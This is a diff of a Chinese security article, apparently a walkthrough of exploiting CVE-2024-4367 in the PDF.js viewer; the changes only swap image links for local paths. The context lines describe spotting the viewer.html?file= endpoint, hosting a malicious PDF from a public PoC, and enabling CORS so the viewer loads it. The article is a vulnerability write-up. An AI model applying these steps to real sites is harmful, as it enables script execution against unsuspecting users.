@@ -76,13 +76,13 @@ cript代码，影响范围包括Firefox浏览器及依赖PDF.js的Web/Electron�
    
    http://xxx.com/xxx/xxxx/html/web/viewer.html?file= 形如这类格式的，功能点为预览PDF内容可以确定为PDF.JS组件  
   
-![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv5lfqdZJcNJgNHGjKGMvQRibl6zVtC8Duha5ka1lsGNMW7ibJSJTPYqljzB9acIJMcwhnjsibn6quhS4j4ZlGYVqmhCrta2RibFx8Q/640?wx_fmt=jpeg&from=appmsg "")  
+![img](../../.resource/remote/da6ea924cc40aba95b1147240a537055723e4530432f0b642ceb772d2960940f.jpg "")  
   
   
    
    发现这里File参数支持http协议获取PDF内容  
   
-![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv68KxtyhicPOk3KjF5eXsjI0aIvhF9MtlHnpxl494WrhmmEhGSCdEV3ttrVXpycrrGKVMqHZnSGSiaBCJr56EhlrMXqTtGfDvDY0/640?wx_fmt=jpeg&from=appmsg "")  
+![img](../../.resource/remote/01f63ef87d7f1a66046ef23fa6f1f58e9655b872fb7bf67cdd8674070d7c573b.jpg "")  
   
   
     那么可以尝试远程加载恶意pdf的方式来利用该漏洞(如果这里不存在远程加载，仍然可以通过寻找上传口上传pdf文件来实现漏洞利用，这里不再赘述)  
@@ -96,7 +96,7 @@ https://github.com/LOURC0D3/CVE-2024-4367-PoC/blob/main/CVE-2024-4367.py
   
 利用服务器起一个服务：  
   
-![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv6icmiba7CjyEicG4SeneAxqCND6hEFe3SOxF6RXKBF21M9IHwHneblU9DM6lvyf4E3mVeQh1RfupZqTjZVtpbElSmCtdj5wxV7OU/640?wx_fmt=jpeg&from=appmsg "")  
+![img](../../.resource/remote/851b9fbae4090fa7dab8f3a1404bd44d2e022e08a5737757405752b8164c0a4c.jpg "")  
   
   
 然后利用组件访问恶意服务器  
@@ -108,7 +108,7 @@ http://xxx.com/web/viewer.html?file=http://xxx.com/poc.pdf
       
 有时会发现显示载入pdf时发生错误。这时候或许并不是不能加载，而是python起服务默认不会开启cors可跨域，导致浏览器直接阻止了pdf.js获取pdf文件。  
   
-![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv6kY12y3I1uzQhYVmyUvibWqoVbaicLoFEgr7nW2EicGbfxdE7MuMdvQ00pJ5Zlar9AaPZty6biaib7bNn8blr6jEO7IgxqPPSge76c/640?wx_fmt=jpeg&from=appmsg "")  
+![img](../../.resource/remote/e26e401e1dc2494155d17bf7f342bccae9b01f139952b3cdec851be5e924a14a.jpg "")  
   
 那么这里则需要构造python脚本开启cors可任意跨域  
   
@@ -117,12 +117,12 @@ http://xxx.com/web/viewer.html?file=http://xxx.com/poc.pdf
 
 此时在起python服务  
   
-![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv6dlBgvV7qxQib5vzerQWZfnicOByLj19gocC1kmniaZmSdRicfvHBSvj5mCibv16Yn2t0ZziaC4T69zUU1Bdgxt5ynLdQA5Z5xeRbE0/640?wx_fmt=jpeg&from=appmsg "")  
+![img](../../.resource/remote/30ce338cb0879926ff7e6ddfa3fc9229caf4a60d890ccf49cbe296f4183c2a47.jpg "")  
   
   
 访问就可以正常执行了  
   
-![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv6I5mgLMfMsuVOiabYLfjojuI3kvyQUVYjwDrMXsFg1jhibaiajTEKcYyCiaOEH7VvnGukKLXbJftrkUwUae2oQOiaRx7KRqJvTypZ4/640?wx_fmt=jpeg&from=appmsg "")  
+![img](../../.resource/remote/1d3c2544e52c774c5ae9cc7e0d2b196a8b0624da3fb39e86b380e485fc56dfc3.jpg "")  
   
   
    
